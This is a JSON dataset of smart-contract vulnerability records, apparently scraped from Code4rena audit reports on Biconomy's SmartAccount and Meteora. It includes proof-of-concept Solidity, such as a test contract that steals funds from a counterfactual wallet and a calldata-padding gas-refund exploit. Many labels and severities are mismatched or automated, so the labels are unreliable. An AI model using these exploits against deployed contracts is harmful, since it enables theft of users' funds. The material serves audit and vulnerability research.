[
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Gas",
    "title": "Publicly Known Issues",
    "description": "_Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._ - **Swap rate limiter bypass vulnerability via swap2 instruction:** It is possible to bypass the `feeRateLimiter` mode, in particular the swap rate limiter (an anti-sniping feature - which prevents snipers from bundling multiple swap instructions in one transaction) by using the `swap2` instruction handler. The vulnerability arises from the lack of a `swap2` discriminator check in the function `validate_single_swap_instruction()`. (C4 staff note: this issue was addressed by a public [PR](https://github.com/MeteoraAg/dynamic-bonding-curve/pull/128) on September 5, 2025 at 4:36AM UTC; therefore all submissions of this finding after that timestamp will be considered out of scope.)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-08-meteora",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "dynamic-bonding-curve-sdk/src/tests/test_quote_partial_fill.rs",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Files out of Scope: (13 files)",
    "description": "- [`dynamic-bonding-curve-sdk/src/lib.rs`](https://github.com/MeteoraAg/dynamic-bonding-curve/blob/30dd2a1fc5c90949e2038f61c19dc03fee513d98/dynamic-bonding-curve-sdk/src/lib.rs) - [`dynamic-bonding-curve-sdk/src/quote_exact_in.rs`](https://github.com/MeteoraAg/dynamic-bonding-curve/blob/30dd2a1fc5c90949e2038f61c19dc03fee513d98/dynamic-bonding-curve-sdk/src/quote_exact_in.rs) - [`dynamic-bonding-curve-sdk/src/quote_exact_out.rs`](https://github.com/MeteoraAg/dynamic-bonding-curve/blob/30dd2a1fc5c90949e2038f61c19dc03fee513d98/dynamic-bonding-curve-sdk/src/quote_exact_out.rs) - [`dynamic-bonding-curve-sdk/src/quote_partial_fill.r`s](https://github.com/MeteoraAg/dynamic-bonding-curve/blob/30dd2a1fc5c90949e2038f61c19dc03fee513d98/dynamic-bonding-curve-sdk/src/quote_partial_fill.rs) - [`tests/mod.rs`](https://github.com/MeteoraAg/dynamic-bonding-curve/blob/30dd2a1fc5c90949e2038f61c19dc03fee513d98/programs/dynamic-bonding-curve/src/tests/mod.rs)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-08-meteora",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.062,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Gas",
    "title": "Publicly Known Issues",
    "description": "_Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._ - **Swap rate limiter bypass vulnerability via swap2 instruction:** It is possible to bypass the `feeRateLimiter` mode, in particular the swap rate limiter (an anti-sniping feature - which prevents snipers from bundling multiple swap instructions in one transaction) by using the `swap2` instruction handler. The vulnerability arises from the lack of a `swap2` discriminator check in the function `validate_single_swap_instruction()`. (C4 staff note: this issue was addressed by a public [PR](https://github.com/MeteoraAg/dynamic-bonding-curve/pull/128) on September 5, 2025 at 4:36AM UTC; therefore all submissions of this finding after that timestamp will be considered out of scope.)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-08-meteora",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "dynamic-bonding-curve-sdk/src/tests/test_quote_partial_fill.rs",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Files out of Scope: (13 files)",
    "description": "- [`dynamic-bonding-curve-sdk/src/lib.rs`](https://github.com/MeteoraAg/dynamic-bonding-curve/blob/30dd2a1fc5c90949e2038f61c19dc03fee513d98/dynamic-bonding-curve-sdk/src/lib.rs) - [`dynamic-bonding-curve-sdk/src/quote_exact_in.rs`](https://github.com/MeteoraAg/dynamic-bonding-curve/blob/30dd2a1fc5c90949e2038f61c19dc03fee513d98/dynamic-bonding-curve-sdk/src/quote_exact_in.rs) - [`dynamic-bonding-curve-sdk/src/quote_exact_out.rs`](https://github.com/MeteoraAg/dynamic-bonding-curve/blob/30dd2a1fc5c90949e2038f61c19dc03fee513d98/dynamic-bonding-curve-sdk/src/quote_exact_out.rs) - [`dynamic-bonding-curve-sdk/src/quote_partial_fill.r`s](https://github.com/MeteoraAg/dynamic-bonding-curve/blob/30dd2a1fc5c90949e2038f61c19dc03fee513d98/dynamic-bonding-curve-sdk/src/quote_partial_fill.rs) - [`tests/mod.rs`](https://github.com/MeteoraAg/dynamic-bonding-curve/blob/30dd2a1fc5c90949e2038f61c19dc03fee513d98/programs/dynamic-bonding-curve/src/tests/mod.rs)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-08-meteora",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.062,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\nThe destruction of the implementation contract would result in the freezing of all functionality of the wallets that point to such an implementation. It would also be impossible to change the implementation address, as the ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[[H-01] Destruction of the `SmartAccount` implementation](https://github.com/code-423n4/2023-01-biconomy-findings/issues/496)",
    "description": "*Submitted by [V\\_B](https://github.com/code-423n4/2023-01-biconomy-findings/issues/496), also found by [gogo](https://github.com/code-423n4/2023-01-biconomy-findings/issues/491), [gogo](https://github.com/code-423n4/2023-01-biconomy-findings/issues/474), [adriro](https://github.com/code-423n4/2023-01-biconomy-findings/issues/443), [smit\\_rajput](https://github.com/code-423n4/2023-01-biconomy-findings/issues/357), [Koolex](https://github.com/code-423n4/2023-01-biconomy-findings/issues/324), [hihen](https://github.com/code-423n4/2023-01-biconomy-findings/issues/229), [spacelord47](https://github.com/code-423n4/2023-01-biconomy-findings/issues/201), [0xdeadbeef0x](https://github.com/code-423n4/2023-01-biconomy-findings/issues/174), [Matin](https://github.com/code-423n4/2023-01-biconomy-findings/issues/169), [chaduke](https://github.com/code-423n4/2023-01-biconomy-findings/issues/155), [jonatascm](https://github.com/code-423n4/2023-01-biconomy-findings/issues/98), [ro](https://github.com/code-423n4/2023-01-biconomy-findings/issues/60), [taek](https://github.com/code-423n4/2023-01-biconomy-findings/issues/41), [HE1M](https://github.com/code-423n4/2023-01-biconomy-findings/issues/39), and [kankodu](https://github.com/code-423n4/2023-01-biconomy-findings/issues/14)* [contracts/smart-contract-wallet/SmartAccount.sol#L166](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L166)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L192](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L192)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L229](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L229)<br> [contracts/smart-contract-wallet/base/Executor.sol#L23](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol#L23)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.225,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n// Constructor ensures that this implementation contract can not be initialized\nconstructor() public {\n    owner = address(1);\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Add to the deploy script initialization of the `SmartAccount` implementation, or add to the `SmartAccount` contract the following constructor that will prevent implementation contract from the initialization: // Constructor ensures that this implementation contract can not be initialized constructor() public { owner = address(1); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.138,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "gasleft() - startGas",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[[H-02] Theft of funds under relaying the transaction](https://github.com/code-423n4/2023-01-biconomy-findings/issues/489)",
    "description": "*Submitted by [V\\_B](https://github.com/code-423n4/2023-01-biconomy-findings/issues/489), also found by [DevTimSch](https://github.com/code-423n4/2023-01-biconomy-findings/issues/535)* [contracts/smart-contract-wallet/SmartAccount.sol#L200](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L200)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L239](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L239)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L248](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L248) The `execTransaction` function is designed to accept a relayed transaction with a transaction cost refund. At the beginning of the function, the `startGas` value is calculated as the amount of gas that the relayer will approximately spend on the transaction initialization, including the base cost of `21000` gas and the cost per calldata byte of `msg.data.length * 8` gas. At the end of the function, the total consumed gas is calculated as `gasleft() - startGas` and the appropriate refund is sent to the relayer.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n// Basically, just add zero bytes at the end\nabi.encodeWithSignature(RelayerManager.execute.selector, (...)) || 0x00[]\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Attack Scenario",
    "description": "Let\u2019s a smart wallet user signs a transaction. Some of the relayers trying to execute this transaction and send a transaction to the `SmartAccount` contract. Then, an attacker can frontrun the transaction, changing the transaction calldata by adding the zeroes bytes at the end. So, the original transaction has such calldata: abi.encodeWithSignature(RelayerManager.execute.selector, (...)) The modified (frontrun) transaction calldata: // Basically, just add zero bytes at the end",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.12,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\npragma solidity ^0.8.12;\n\ncontract DummySmartWallet {\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures\n    ) external {\n        // Do nothing, just test that data with appended zero bytes are accepted by Solidity\n    }\n}\n\ncontract PoC {\n    address immutable smartWallet;\n\n    constructor() {\n        smartWallet = address(new DummySmartWallet());\n    }\n\n    // Successfully call with original data\n    function testWithOriginalData() external {\n        bytes memory txCalldata = _getOriginalTxCalldata();\n\n        (bool success, ) = smartWallet.call(txCalldata);\n        require(success);\n    }\n\n    // Successfully call with original data + padded zero bytes\n    function testWithModifiedData() external {\n        bytes memory originalTxCalldata = _getOriginalTxCalldata();\n        bytes memory zeroBytes = new bytes(100000);\n\n        bytes memory txCalldata = abi.encodePacked(originalTxCalldata, zeroBytes);\n\n        (bool success, ) = smartWallet.call(txCalldata);\n        require(success);\n    }\n\n    function _getOriginalTxCalldata() internal pure returns(bytes memory) {\n        Transaction memory transaction;\n        FeeRefund memory refundInfo;\n        bytes memory signatures;\n        return abi.encodeWithSelector(DummySmartWallet.execTransaction.selector, transaction, uint256(0), refundInfo, signatures);\n    }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "The PoC shows that the function may accept the data with redundant zeroes at the end. At the code above, an attacker send a 100\\_000 meaningless zeroes bytes, that gives a `100_000 * 4 = 400_000` additional gas refund. Technically, it is possible to pass even more zero bytes. pragma solidity ^0.8.12; contract DummySmartWallet { function execTransaction( Transaction memory _tx,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 48,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nfunction deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){\n    bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n    bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));\n    // solhint-disable-next-line no-inline-assembly\n    assembly {\n        proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)\n    }\n    require(address(proxy) != address(0), \"Create2 call failed\");\n    // EOA + Version tracking\n    emit SmartAccountCreated(proxy,_defaultImpl,_owner, VERSION, _index);\n    BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);\n    isAccountExist[proxy] = true;\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[[H-03] Attacker can gain control of counterfactual wallet](https://github.com/code-423n4/2023-01-biconomy-findings/issues/460)",
    "description": "*Submitted by [adriro](https://github.com/code-423n4/2023-01-biconomy-findings/issues/460), also found by [0x73696d616f](https://github.com/code-423n4/2023-01-biconomy-findings/issues/536), [giovannidisiena](https://github.com/code-423n4/2023-01-biconomy-findings/issues/522), [Qeew](https://github.com/code-423n4/2023-01-biconomy-findings/issues/518), [V\\_B](https://github.com/code-423n4/2023-01-biconomy-findings/issues/482), [0x1f8b](https://github.com/code-423n4/2023-01-biconomy-findings/issues/464), [adriro](https://github.com/code-423n4/2023-01-biconomy-findings/issues/458), [ey88](https://github.com/code-423n4/2023-01-biconomy-findings/issues/456), [wait](https://github.com/code-423n4/2023-01-biconomy-findings/issues/407), [Haipls](https://github.com/code-423n4/2023-01-biconomy-findings/issues/404), [betweenETHlines](https://github.com/code-423n4/2023-01-biconomy-findings/issues/369), [Lirios](https://github.com/code-423n4/2023-01-biconomy-findings/issues/364), [hihen](https://github.com/code-423n4/2023-01-biconomy-findings/issues/331), [hihen](https://github.com/code-423n4/2023-01-biconomy-findings/issues/287), [horsefacts](https://github.com/code-423n4/2023-01-biconomy-findings/issues/284), [bin2chen](https://github.com/code-423n4/2023-01-biconomy-findings/issues/278), [ast3ros](https://github.com/code-423n4/2023-01-biconomy-findings/issues/268), [aviggiano](https://github.com/code-423n4/2023-01-biconomy-findings/issues/202), [0xdeadbeef0x](https://github.com/code-423n4/2023-01-biconomy-findings/issues/176), [chaduke](https://github.com/code-423n4/2023-01-biconomy-findings/issues/164), [Jayus](https://github.com/code-423n4/2023-01-biconomy-findings/issues/162), [ladboy233](https://github.com/code-423n4/2023-01-biconomy-findings/issues/148), [ladboy233](https://github.com/code-423n4/2023-01-biconomy-findings/issues/143), [zaskoh](https://github.com/code-423n4/2023-01-biconomy-findings/issues/137), [Kalzak](https://github.com/code-423n4/2023-01-biconomy-findings/issues/135), [dragotanqueray](https://github.com/code-423n4/2023-01-biconomy-findings/issues/95), [BClabs](https://github.com/code-423n4/2023-01-biconomy-findings/issues/92), and [HE1M](https://github.com/code-423n4/2023-01-biconomy-findings/issues/37)* A counterfactual wallet can be used by pre-generating its address using the `SmartAccountFactory.getAddressForCounterfactualWallet` function. This address can then be securely used (for example, sending funds to this address) knowing in advance that the user will later be able to deploy it at the same address to gain control. However, an attacker can deploy the counterfactual wallet on behalf of the owner and use an arbitrary entrypoint: <https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45> function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.763,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nfunction execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n    success = execute(dest, value, func, operation, gasLimit);\n    require(success, \"Userop Failed\");\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Impact",
    "description": "After the attacker has deployed the wallet with its own entrypoint, this contract can be used to execute any arbitrary call or code (using `delegatecall`) using the `execFromEntryPoint` function: <https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489-L492> function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) { success = execute(dest, value, func, operation, gasLimit); require(success, \"Userop Failed\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.289,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontract StealEntryPoint {\n    function steal(SmartAccount wallet) public {\n        uint256 balance = address(wallet).balance;\n\n        wallet.execFromEntryPoint(\n            msg.sender, // address dest\n            balance, // uint value\n            \"\", // bytes calldata func\n            Enum.Operation.Call, // Enum.Operation operation\n            gasleft() // uint256 gasLimit\n        );\n    }\n}\n\ncontract AuditTest is Test {\n    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\n    uint256 bobPrivateKey = 0x123;\n    uint256 attackerPrivateKey = 0x456;\n\n    address deployer;\n    address bob;\n    address attacker;\n    address entrypoint;\n    address handler;\n\n    SmartAccount public implementation;\n    SmartAccountFactory public factory;\n    MockToken public token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        bob = vm.addr(bobPrivateKey);\n        attacker = vm.addr(attackerPrivateKey);\n        entrypoint = makeAddr(\"entrypoint\");\n        handler = makeAddr(\"handler\");\n\n        vm.label(deployer, \"deployer\");\n        vm.label(bob, \"bob\");\n        vm.label(attacker, \"attacker\");\n\n        vm.startPrank(deployer);\n        implementation = new SmartAccount();\n        factory = new SmartAccountFactory(address(implementation));\n        token = new MockToken();\n        vm.stopPrank();\n    }\n    \n    function test_SmartAccountFactory_StealCounterfactualWallet() public {\n        uint256 index = 0;\n        address counterfactualWallet = factory.getAddressForCounterfactualWallet(bob, index);\n        // Simulate Bob sends 1 ETH to the wallet\n        uint256 amount = 1 ether;\n        vm.deal(counterfactualWallet, amount);\n\n        // Attacker deploys counterfactual wallet with a custom entrypoint (StealEntryPoint)\n        vm.startPrank(attacker);\n\n        StealEntryPoint stealer = new StealEntryPoint();\n\n        address proxy = factory.deployCounterFactualWallet(bob, address(stealer), handler, index);\n        SmartAccount wallet = SmartAccount(payable(proxy));\n\n        // address is the same\n        assertEq(address(wallet), counterfactualWallet);\n\n        // trigger attack\n        stealer.steal(wallet);\n\n        vm.stopPrank();\n\n        // Attacker has stolen the funds\n        assertEq(address(wallet).balance, 0);\n        assertEq(attacker.balance, amount);\n    }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "In the following test, the attacker deploys the counterfactual wallet using the `StealEntryPoint` contract as the entrypoint, which is then used to steal any funds present in the wallet. contract StealEntryPoint { function steal(SmartAccount wallet) public { uint256 balance = address(wallet).balance; wallet.execFromEntryPoint(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 78,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "proxy: 0x11dc228AB5BA253Acb58245E10ff129a6f281b09",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "Proof of Concept",
    "description": "The protocol supports contract signed transactions (eip-1271). The support is implemented in the `checkSignature` call when providing a transaction:<br> [contracts/smart-contract-wallet/SmartAccount.sol#L218](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L218)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L342](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342) function execTransaction( Transaction memory _tx,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.049,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "validatePaymasterUserOp",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Since `validatePaymasterUserOp` function is not limited to view function in erc4337 spec, add simple boolean data for mapping if hash is used or not mapping(bytes32 => boolean) public usedHash function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund) external override returns (bytes memory context, uint256 deadline) { (requiredPreFund);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "FeeRefund.tokenGasPriceFactor",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "High",
    "title": "[[H-06] `FeeRefund.tokenGasPriceFactor` is not included in signed transaction data allowing the submitter to steal funds](https://github.com/code-423n4/2023-01-biconomy-findings/issues/123)",
    "description": "*Submitted by [Ruhum](https://github.com/code-423n4/2023-01-biconomy-findings/issues/123), also found by [V\\_B](https://github.com/code-423n4/2023-01-biconomy-findings/issues/492), [adriro](https://github.com/code-423n4/2023-01-biconomy-findings/issues/447), [immeas](https://github.com/code-423n4/2023-01-biconomy-findings/issues/414), [supernova](https://github.com/code-423n4/2023-01-biconomy-findings/issues/300), [MalfurionWhitehat](https://github.com/code-423n4/2023-01-biconomy-findings/issues/211), [cccz](https://github.com/code-423n4/2023-01-biconomy-findings/issues/193), and [ladboy233](https://github.com/code-423n4/2023-01-biconomy-findings/issues/165)* [contracts/smart-contract-wallet/SmartAccount.sol#L288](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L288)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L429-L444](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L429-L444) The submitter of a transaction is paid back the transaction's gas costs either in ETH or in ERC20 tokens. With ERC20 tokens the following formula is used: $(gasUsed + baseGas) \\* gasPrice / tokenGasPriceFactor$. `baseGas`, `gasPrice`, and `tokenGasPriceFactor` are values specified by the tx submitter. Since you don't want the submitter to choose arbitrary values and pay themselves as much as they want, those values are supposed to be signed off by the owner of the wallet. The signature of the user is included in the tx so that the contract can verify that all the values are correct. But, the `tokenGasPriceFactor` value is not included in those checks. Thus, the submitter is able to simulate the tx with value $x$, get the user to sign that tx, and then submit it with $y$ for `tokenGasPriceFactor`. That way they can increase the actual gas repayment and steal the user's funds.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.029,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "sol\n    function handlePayment(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) private nonReentrant returns (uint256 payment) {\n        // uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        // uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hp %s\", requiredGas);\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "In `encodeTransactionData()` we can see that `tokenGasPriceFactor` is not included: function encodeTransactionData( Transaction memory _tx, FeeRefund memory refundInfo, uint256 _nonce",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "encodeTransactionData",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Add `batchId` to the hash calculation of the transaction in `encodeTransactionData` function. **[livingrockrises (Biconomy) confirmed](https://github.com/code-423n4/2023-01-biconomy-findings/issues/36#issuecomment-1404370864)** ***",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
